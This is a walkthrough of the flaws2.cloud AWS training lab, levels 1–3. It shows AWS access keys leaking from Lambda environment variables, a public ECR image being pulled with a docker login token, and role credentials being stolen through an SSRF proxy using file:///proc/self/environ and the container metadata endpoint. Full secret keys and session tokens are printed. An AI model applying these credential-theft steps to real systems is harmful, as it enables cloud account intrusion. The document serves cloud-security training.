# Flaws II

Link to Challenge: [flaws2.cloud](http://flaws2.cloud/)  
Credits: [@0xdabbad00](https://twitter.com/0xdabbad00)

## Level 1 - Exposed environment variables through Lambda function

!!!help "Objective"
    For this level, you'll need to enter the correct PIN code.
    The correct PIN is 100 digits long, so brute forcing it won't help. 

```
Error, malformed input
{"AWS_LAMBDA_FUNCTION_VERSION":"$LATEST","AWS_LAMBDA_INITIALIZATION_TYPE":"on-demand","LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib","AWS_LAMBDA_LOG_STREAM_NAME":"2022/12/15/[$LATEST]90366030bb464441a68998b9127eef29","AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128","PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin","AWS_SECRET_ACCESS_KEY":"K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs","LANG":"en_US.UTF-8","_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.129","AWS_XRAY_DAEMON_ADDRESS":"169.254.79.129:2000","AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGKTT3RYD6","AWS_SESSION_TOKEN":"IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=","LAMBDA_RUNTIME_DIR":"/var/runtime","_AWS_XRAY_DAEMON_PORT":"2000","AWS_REGION":"us-east-1","AWS_DEFAULT_REGION":"us-east-1","_HANDLER":"index.handler","AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1","AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10","TZ":":UTC","AWS_LAMBDA_FUNCTION_NAME":"level1","AWS_LAMBDA_RUNTIME_API":"127.0.0.1:9001","AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR","LAMBDA_TASK_ROOT":"/var/task","NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules","_X_AMZN_TRACE_ID":"Root=1-639ae1e9-5cd0a30149fb59526795ddcd;Parent=1884fb2965de9ad2;Sampled=0"}
```


```js
function validateForm() {
    var code = document.forms["myForm"]["code"].value;
    if (!(!isNaN(parseFloat(code)) && isFinite(code))) {
        alert("Code must be a number");
        return false;
    }
}x9sByb69uZ3Qipwx61jqpSOdizhGGLk5JytiUVy2
```

```html
<form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
```

The lambda function debugging message will contain **environment variables** used by the instance:

```
"AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGKTT3RYD6"
"AWS_SECRET_ACCESS_KEY":"K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs"
"AWS_SESSION_TOKEN":"IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA="
```

We can import those in a profile using `aws configure --profile level1`, remember to add the session token as part of the credential config:

!!!warning
    [Temporary (AWS STS) access key IDs](https://docs.aws.amazon.com/STS/latest/APIReference/API_Credentials.html) - as denoted by the `ASIA` prefix in the `AccessKeyId` field - require to add an extra field in the `aws profile` configuration file:
        ```
        # cat ~/.aws/credentials
        [level1]
        aws_access_key_id = <AccessKeyId>
        aws_secret_access_key = <SecretAccessKey> 
        aws_session_token = <Token>
        ```

As usual after obtaining new keys, we perform basic enumeration:

```
fog@cloudbreach:~$ aws sts get-caller-identity --profile flaws2-level1
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

We don't seem to be able to have the right policies (privileges) to use any `iam` function, but we can list the contents of the S3 bucket located at `level1.flaws2.cloud`:

```
fog@cloudbreach:~/flaws_2$ aws s3 ls level1.flaws2.cloud --profile flaws2-level1
                           PRE img/
2018-11-20 15:55:05      17102 favicon.ico
2018-11-20 21:00:22       1905 hint1.htm
2018-11-20 21:00:22       2226 hint2.htm
2018-11-20 21:00:22       2536 hint3.htm
2018-11-20 21:00:23       2460 hint4.htm
2018-11-20 21:00:17       3000 index.htm
2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

Visiting `secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html` leads us to the next [level](http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/).


![](/images/aws/training_labs/flaws_2_level2.png)

---

## Level 2 - Elastic Container Registries (ECR)


!!!help "Objective"
    This next level is running as a container at [http://container.target.flaws2.cloud/](http://container.target.flaws2.cloud/) Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2". 


```
fog@cloudbreach:~/flaws_2$ aws ecr list-images --repository-name level2 --profile flaws2-level1
{
    "imageIds": [
        {
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTag": "latest"
        }
    ]
}
```


https://653711331788.dkr.ecr.us-east-1.amazonaws.com

docker login -u AWS -p eyJwYXlsb2FkIjoibWhjK3BHc043T1ZSSEQ0aHo3L1c3RU4yT2MyL3Iyd08rQ3dvZXcwKzRabTByMkZnVDBMeDZDTHBwZW50cnlWLytJN3F2YjRiMGM4OWxpTm9RVmp3aEpUS0tlTGVkR3lQa3ZpMjY3MVhjWjc0OFFTa25TY2YzcWdTTmwzcUtuQjU0REZGaTV4NE9rV3o1bnBEbytDazV5TE1aTzgzOVMxc2szY1FXR1I5OWZ5YUFOanpmaHVrbmZIMTRIT0pZMWx2RHlXTWVBdkNSQUd6OUM4UGc1STAzcVRiUERvNDlEa2V3NVNKeTVnUWlJNDQwaldKUTh0UWRSalMvblF5U2JrNzVFLzdXcE1zNHhtdzVtU2ZXTnp3eDFmRGdLSFlGeVVyMVU4WFpTemMyN1VFUE1BWi9qYlFFU3U5L243Q3RwWnlPemxqN3V4a0VYSnQyakNFdGFjNHZKb0JFNWF5dkFlQ3pUdzc0OVlDbll5a2pHbmRpUzJ6a1RZYkl5K0IwbDVVR0h5S0cvc2xYdUxJVkpSTHNkUTBlV0hUVU5sRmJTSHJHSUZYMmZTbnMzSUoreW1uTnR0TlNrdG1QWGZSMXhjWElVRmc2bXI4OTI2VUdLMG5kVFdFUHNGRmxYeUdvMHNvc3JsUmlxTVVKMlpjMStBN2lLWkFpZk1BZU5iN0ZpTWpPNjdnNTdQckExUjdCVmpXbjdHU1NWdGxpT1Rsc1dyM3BBcmtBMHZKYzFJT2JOaDZVNDY3a2tqWkNDaEZUaEJQcVVQRlgvWWNtNUkyb2d0VzRIKzRhMGRlbnZkQytCT2VUbVNFZVVYNTRyclpwSWNKSVBFdFFPOTJZaFJ0ajVReE9OZnZWQUJYd1hqanJvK1B4RVNiUE9JYktnRG1ISGZZMWhibTdSTWRuYk5ZM3p4T2NOYUFQYjBnSjNHUjNpWUNScjFEOFZuUUE2eTNlOEJHZ2xNRUxKZ2tSMDN5akRBdVpGOEwwVE82VjFhSWhZaE1nYzBoQXpWc2VDdHJLZ0VsdVFxWmxvYWJFeStWWFBPYy9uQytDcTQ3VmpXdGZxN1c2bGRNblFORUpibG1zZEF1WW0yL28yQUVqZW42eWJ5SndNVXZHZ3lRTi9CS0FnMnRMb1Jsb1RXbTNBNUY1Slk0N3YxRm11Q3g4b1lGVldUaU4yMStwU1lSNHpsZ0hteFlRMkY0MDBtMFFMWXFJYU04U1J1M2hkVXRRNW1wSG45SjdvTUhXckZRSHhIK1lzUmlxenVlanN0ZmRzd2lqRUgyLzRyUU9pVk9CclkvQ0hBNHR1YmpqcEtwWXFWVnlPZEtIMXV4Slh1eVBTcHRwSFZlZWc2RTR1T1pVN3dKQzhGNGhMRC9SVFJnWnR6MzhFRXZ3WkEyYWlWMVRORVJsdnI0VUhWUmt2dFUydUl5SlY0MGt0eEVkMEh3cXp6L09sWnpMS1VwbHVkaEZMcjBEVDhMT3AxYkljMTlwU0NLelJVVlBFQThiY0x6UlltZURPakNhc1FNY3pSNi9TK1ZoUXA1M0FCUTNPbHdjMWhER0VzTVdyUXZERVRjQ2dvTXQ3U2F5SSs5V3ZDR01hOFdSQ3RPTFlSSjNONE1MaEdYNm4rVXdQTDloRmt3c0piREgzTTNPYS9NRmR2ZFJZR01JYzJzODgxMWtTM0xYUFVka1J3S25NTkkxYWppcjlTL1ZCUlJ2a2tQOFVSOE42UXJzN291ODY5RGxoSTBXTzZFOWdGcDJNZXY3Yks2M3ByMXBkODBBZ1RVWGF0WlVFWkhKUCtpeEI0SGl6STNmTXVLRjRTaC82MVRjdytUa0hDUkVmWVFiWHFTM0gwPSIsImRhdGFrZXkiOiJBUUVCQUhod20wWWFJU0plUnRKbTVuMUc2dXFlZWtYdW9YWFBlNVVGY2U5UnE4LzE0d0FBQUg0d2ZBWUpLb1pJaHZjTkFRY0dvRzh3YlFJQkFEQm9CZ2txaGtpRzl3MEJCd0V3SGdZSllJWklBV1VEQkFFdU1CRUVEQ05JUGdhVk1qamJvWEF1SkFJQkVJQTdMUFlKWGdvaGw0dW5aZjBwUmVUR1lLUUIwbW5YM1E4d3hBVU5KSE1QY2syQ2dGL2hBQ2NmQlhXaEU5SHNDc3hmUms3SFB5akFEaGlGZjgwPSIsInZlcnNpb24iOiIyIiwidHlwZSI6IkRBVEFfS0VZIiwiZXhwaXJhdGlvbiI6MTY3MTIwMTg1OX0= -e none https://653711331788.dkr.ecr.us-east-1.amazonaws.com

docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest


http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/

```
root@9c7df3e509cf:/var/www/html# ll
total 24
drwxr-xr-x 1 root root 4096 Nov 27  2018 ./
drwxr-xr-x 1 root root 4096 Nov 27  2018 ../
-rw-r--r-- 1 root root 1890 Nov 26  2018 index.htm
-rw-r--r-- 1 root root  612 Nov 27  2018 index.nginx-debian.html
-rw-r--r-- 1 root root  614 Nov 27  2018 proxy.py
-rw-r--r-- 1 root root   49 Nov 26  2018 start.sh
root@9c7df3e509cf:/var/www/html# grep 'level3' -R .
./index.htm:            Read about Level 3 at <a href="http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud">level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</a>
```

---

## Level 3 - Stealing Keys from ECR Metadata Service via SSRF

!!!help "Objective"
    The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com 

HOSTNAME=e7393d8eefbb

sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621


proxy/file:///proc/self/environ


```json
{
  "RoleArn": "arn:aws:iam::653711331788:role/level3",
  "AccessKeyId": "ASIAZQNB3KHGKBJ23GKX",
  "SecretAccessKey": "NeTGQ4KXuVgpAvifwSbu89c5P2t+U2jqOhUmMGz9",
  "Token": "IQoJb3JpZ2luX2VjENL//////////wEaCXVzLWVhc3QtMSJHMEUCIQCxXCTsNKHsAz3O2N/Oxnc6yfWfMfhQCxxJyHZulaa1mQIgesLI6mu177DObNIJu7xAnCwLqOpClBXWgmHI1wQcEO0q7AMI+///////////ARADGgw2NTM3MTEzMzE3ODgiDIq+ivyr8Ofng2tMxCrAAyC8jldxrR4gRfqb+Tv/u5WRu/Mjafm6Q8S5M8Kykn9fiKF3sBGFXZg/2tU+UR0JVQvV8gyeoAnIK5F8P5WLOXcEelT+B3ZKmSI5m7o8SIcq1qsTRwMtTOnjLhhVYPVAXPogFMk0ZsVlGSCKoTTjN2dPpSIh4dSSn9nrdG/T9zg+WsA5s9J6VZqFQ6ggym0LGBUpvkAj780IEDs4WNwEqJeO5myChq0kqqcXA5QSFEMPDGu/sZnPVSObrJu/QjPstPF9NEf/4cTZEkW3P01HhfVceQeryJP1RFBnt1Wz0Q4L7DiB2xETA1bJoicsaA3/JcLO2UvPRpqKvClgv0qlBuGlyq9MGtbsd7X1JqdlOLsAspCyuv46aTOeuV3uuAfu6w+T9g0MYEcvqRGgHJG1fUyR9UWWBZwTkx8rnR9kQ9yRHNK117gdYeuLxEsjsT64PzAvATojIlGcrw4eKivv+mrr6O/Sr0SztCv1NajMtoMvYdw9X3iGWwnLUciwypQ+nFOoERlJwXqbP7nvY34YjJcdx2WfzNuT1ie0AtuwLUt9HX5tJyYKsR8kzhrFyUx5eAfv++vNRQcXbpE5Ig9MtoAwnaPvnAY6pQHOC2Snj9DJZVR85prIw1HQImQo+4Nq9TgFHoKR6asdPGYN5jp0VtIW8P/+zSKSXqEZM+ALeTmzbAn1nIbtsNNkYspQL21VeS4wE2hNQlt6PxZnOyRQBEdLCe2IAGDIgzaBg+TD2tZ24bJAMqrPVkF5q+tjf0ai0QE0kqUSV6BSNo248wO0WSEArk4xoxM1eJ4lWGBD70SouvHnLZd7kjcWS4BLRis=",
  "Expiration": "2022-12-16T08:02:05Z"
}
```
HOSTNAME=ip-172-31-48-55.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80AWS_EXECUTION_ENV=AWS_ECS_FARGATEAWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/f6209e98011942c28c1d74f589770aec-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/f6209e98011942c28c1d74f589770aec-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/

/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80

```
fog@cloudbreach:~/flaws_2/level3$ aws s3 ls --profile flaws2-level3
2018-11-20 14:50:08 flaws2.cloud
2018-11-20 13:45:26 level1.flaws2.cloud 2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

